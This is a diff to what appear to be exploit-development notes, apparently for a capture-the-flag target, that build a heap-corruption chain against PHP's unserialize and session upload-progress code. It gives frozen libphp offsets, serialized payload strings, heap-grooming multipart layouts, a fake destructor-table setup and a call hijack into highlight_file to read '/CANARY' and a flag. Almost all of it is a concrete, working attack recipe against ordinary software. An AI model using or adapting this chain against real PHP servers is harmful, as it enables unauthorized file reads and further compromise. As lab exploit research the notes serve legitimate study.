@@ -122,7 +122,66 @@ Adaptation (ce chain in the groom — d chunk is fully attacker bytes):
   only if SID_B token stream has refcounted dup-overwrites; keep SID_B
   stream minimal (e.g. poc|i:1;) so nothing appends.
 
-## cb4 — placement oracle (no brute force needed)
+## cb4 REVISED (v2) — the level problem and its solution
+PROBLEM (proven offline): with the producer's leaked level=1, every
+consumer decode runs init at level 1->2 and destroy at 2->1 ->
+php_var_unserialize_destroy NEVER calls var_destroy on the fake d.
+TODO cb5's "var_destroy walks first_dtor" could never fire as written.
+
+SOLUTION — split the dtor pointers + a wakeup zval write onto
+BG(unserialize).level:
+- fake d sets FIRST_dtor = LG (groom entries, pre-forged) but
+  LAST_dtor = LW = &BG(unserialize).data - 20.
+- SID_B staged token: `poc|O:9:"Exception":0:{}` — Exception has
+  __wakeup (delayed) and NO __unserialize (verified: container php -r,
+  method_exists checks; DOMNode also wakeup-1/unser-0 but not
+  instantiable). object_common's has_wakeup path: var_tmp_var(1)
+  -> writes entry at last_dtor LW+16 = &unserialize.data-4:
+    value(8B) -> serialize.data high4+unserialize.data low4 (garbage,
+    harmless), u1(4B) -> unserialize.data high4, u2(4B)=1 ->
+    **BG(unserialize).level = 1**. used_slots@LW increments
+    (serialize.data high4 -> 1, overwritten at shutdown encode init).
+- decode completes -> destroy: level==1 NOW TRUE -> var_destroy(&d)
+  RUNS: entries.next(groom+64)=0 skip; walks FIRST_dtor=LG (groom):
+  data[0]={V,IS_LONG,2} -> __unserialize branch -> param=ZVAL_COPY(
+  data[1]) -> zend_call_known_instance_method_with_1_params(
+  *(V+16)->+352 = F, obj=V) -> highlight_file("/CANARY") IN-BAND.
+  The LW entry (the Exception wakeup) is NEVER walked (it hangs off
+  last_dtor only) so no genuine __wakeup runs.
+- efree_size(LG,4096): interior page -> no-op. efree(d): run already
+  free (map=0) -> free_large(page,0) no-op. --level -> 0, data=NULL.
+  CHILD ENDS CLEAN AND REPEATABLE.
+
+Constants frozen (B=0xfa2f10be0000, re-read per restart):
+- F (zif_highlight_file E=0xef8f90) = B+0xef8f50; send-mode of
+  arg_info[0] = 0 (clean by-value; readfile cand has mode 1 =
+  ZEND_SEND_BY_REF *must-wrap* — BY_REF=1 PREFER=2 confirmed zend_
+  compile.h:1021 — avoid). highlight output escapes only <>& —
+  FLAG{wordpress-x86:hex} unaffected.
+- L2 (var_entries, zeroed bss) = B+0xf20000 (.bss 0xf08e40..0xf28e10).
+- LG = groom_run_start+4096 (3-page LRUN; interior page for the efree
+  no-op; entries need +4096..+8192 <= 12288).
+- LW = &BG(unserialize).data - 20 = runtime-diff of basic_globals
+  (B+0xf1e748, 1304B window) before/after producer fire: the qword
+  that becomes a heap pointer = &BG(unserialize).data; its VALUE =
+  producer d chunk = groom_run_start (both needed constants in ONE
+  oracle read).
+- zstr @ groom+256: zend_string {refcount=100,gc.type=6,h=0,len=7,
+  "/CANARY"}.
+- V=C @ groom+72: *(V+16)=V, *(V+352)=F_rt.
+- groom carrier: multipart field VALUE exactly 8192B (final erealloc
+  8193 -> 3-page LRUN, same class as d 8216; NAME carrier impossible —
+  estrdup NUL-truncation kills pointers).
+- groom value field placed BEFORE the FILE part; value buffer efree'd
+  at its part end (run free, bytes intact) -> FILE_START decode uses
+  stale data ptr = same run.
+- producer: staged SID_A `poc|a:2:{i:0;s:3:"abc";i:1;s:72000000:
+  "<72MB A>"}` + ONE multipart POST (proven OOM, level=1 leaked).
+- consumer: SID_B staged `poc|O:9:"Exception":0:{}` + multipart
+  (PHPSESSID, UPLOAD_PROGRESS, groom VALUE field, FILE part).
+- pair on same child: raw-socket keep-alive, pauses <5s.
+- d chunk freed at producer shutdown (proven 4/6 evidence), reclaimed
+  by consumer groom buffer (3-page best-fit), re-freed at part end.
 - B (libphp bias) from /proc/<child>/maps as HOST root (children are
   non-dumpable for in-container root; host root reads fine). Forked
   children share the parent's mappings: B = 0xfa2f10be0000 observed
